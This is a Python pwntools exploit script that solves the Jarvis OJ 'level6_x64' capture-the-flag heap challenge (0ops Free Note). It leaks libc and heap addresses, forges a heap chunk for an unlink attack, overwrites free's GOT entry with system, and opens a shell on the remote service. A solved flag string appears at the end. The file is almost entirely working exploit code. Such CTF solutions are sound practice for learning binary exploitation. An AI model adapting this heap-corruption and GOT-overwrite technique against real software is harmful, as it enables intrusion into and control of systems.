#!/usr/bin/python3
# -*- coding: utf-8 -*-

"""
@author: starvii
如果依赖特定版本的libc，请使用patchelf对可执行文件修改

patchelf --set-interpreter /glibc/2.19/64/lib/ld-linux-x86-64.so.2 ./level6_x64_patched
patchelf --replace-needed libc.so.6 ./libc-2.19.so ./level6_x64_patched
"""

import re
import sys
from os import path
from pwn import *
from pwnlib import gdb
from pwnlib.ui import pause

context(arch="amd64", os="linux", log_level="debug")

elf_name = path.join(path.dirname(path.abspath(__file__)), "level6_x64_patched")
_, host, port = re.split("\s+", "nc pwn2.jarvisoj.com 9886")

elf = ELF(elf_name)
libc = elf.libc
io = remote(host, port) if len(sys.argv) > 1 else process(elf_name)


def main():
    def show():
        io.sendlineafter(": ", "1")
        return io.recvuntil("== 0ops Free Note ==", drop=True)

    def add(size, data):
        io.sendlineafter(": ", "2")
        io.sendlineafter(": ", str(size))
        io.sendafter(": ", data)

    def edit(idx, size, data):
        io.sendlineafter(": ", "3")
        io.sendlineafter(": ", str(idx))
        io.sendlineafter(": ", str(size))
        io.sendafter(": ", data)
        
    def delete(idx):
        io.sendlineafter(": ", "4")
        io.sendlineafter(": ", str(idx))

    N = 0x80
    add(N, "0" * N)
    add(N, "1" * N)
    add(N, "2" * N)
    add(N, "3" * N)

    delete(2)
    delete(0)

    edit(1, N + 0x10, "a" * (N + 0x10))  # 调整1的大小，使其刚好覆盖2的头部
    a = show().split(b"a" * (N + 0x10))[1].split(b"\n3. ")[0]
    libc_addr = u64(a.ljust(8, b"\0"))
    log.success("libc_addr = 0x%x", libc_addr)  # 0x00007ffff7a13000 0x7ffff7dd57b8
    libc.address = (libc_addr - 0x3c2000) & 0xfffffffffffff000
    log.success("libc_base = 0x%x", libc.address)
    log.success("system_addr = 0x%x", libc.sym["system"])
    bin_sh_addr = next(libc.search(b"/bin/sh"))
    log.success("bin_sh_addr = 0x%x", bin_sh_addr)

    edit(1, N + 0x18, "b" * (N + 0x18)) # 调整1的大小，使其刚好覆盖2的头部和第一个8bytes
    a = show().split(b"b" * (N + 0x18))[1].split(b"\n3. ")[0]
    heap_addr = u64(a.ljust(8, b"\0"))
    log.success("heap_addr = 0x%x", heap_addr)
    heap_base = (heap_addr - 0x1000) & 0xfffffffffffff000
    log.success("heap_base = 0x%x", heap_base)

    p_fake_chunk = heap_base + 0x48
    log.success("p_fake_chunk = x/100gx 0x%x; ", p_fake_chunk)

    # 在1中伪造chunk
    edit(1, N + 0x10, flat((
        0, N & 1,
        p_fake_chunk - 8 * 3, p_fake_chunk - 8 * 2,
        "c" * (N - 0x20),
        N, N + 0x10,
    )))

    delete(2)

    payload = flat((
        "@" * 8,  # 0
        1, 0x08, elf.got["free"],  # 1
        1, 0x08, bin_sh_addr,  # 2
    )).ljust(N + 0x10, b"\0")
    edit(1, N + 0x10, payload)
    edit(1, 0x08, p64(libc.sym["system"]))
    delete(2)

    # gdb.attach(io)
    # pause()

    io.interactive()

if __name__ == "__main__":
    main()

# CTF{de7effd8864f018660e178b96b8b4ffc}
